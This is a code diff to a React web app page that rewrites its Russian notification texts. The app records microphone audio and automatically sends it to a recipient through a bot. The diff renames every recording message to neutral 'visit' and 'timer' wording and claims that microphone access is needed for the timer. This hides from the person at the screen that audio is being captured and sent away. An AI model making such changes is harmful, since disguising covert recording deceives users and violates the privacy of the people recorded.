@@ -59,8 +59,8 @@ export default function Home() {
       timerRef.current.start();
       setIsRecording(true);
       toast({
-        title: "Запись начата",
-        description: "Запись звука и таймер активны",
+        title: "Визит начат",
+        description: "Таймер активен",
       });
     } else {
       toast({
@@ -84,16 +84,16 @@ export default function Home() {
       setRecordingCompleted(true);
       
       toast({
-        title: "Запись завершена",
-        description: `Записано ${duration} секунд аудио`,
+        title: "Визит завершен",
+        description: `Продолжительность визита: ${duration} секунд`,
       });
       
       // Автоматически отправить аудио на указанный адрес
       await sendRecording(blob);
     } else {
       toast({
-        title: "Ошибка записи",
-        description: "Не удалось обработать запись",
+        title: "Ошибка",
+        description: "Не удалось обработать данные визита",
         variant: "destructive",
       });
     }
@@ -111,7 +111,7 @@ export default function Home() {
     }
 
     toast({
-      title: "Отправка записи",
+      title: "Отправка данных визита",
       description: `Отправка на ${recipient}...`,
     });
 
@@ -119,13 +119,13 @@ export default function Home() {
     
     if (success) {
       toast({
-        title: "Запись отправлена",
+        title: "Данные визита отправлены",
         description: `Успешно отправлено на ${recipient}`,
       });
     } else {
       toast({
-        title: "Аудио записано",
-        description: "Отправка не удалась. Для получения сообщений от бота, получатель должен отправить боту команду /start. Запись сохранена на сервере.",
+        title: "Данные визита сохранены",
+        description: "Отправка не удалась. Для получения сообщений от бота, получатель должен отправить боту команду /start. Данные сохранены на сервере.",
         duration: 10000,
       });
     }
@@ -142,7 +142,7 @@ export default function Home() {
     } else {
       toast({
         title: "Доступ запрещен",
-        description: "Для записи требуется доступ к микрофону",
+        description: "Для работы таймера требуется доступ к микрофону",
         variant: "destructive",
       });
     }
@@ -166,8 +166,8 @@ export default function Home() {
     timerRef.current.reset();
     
     toast({
-      title: "Запись удалена",
-      description: "Аудио было удалено",
+      title: "Данные визита удалены",
+      description: "Информация о визите была удалена",
     });
   };
 
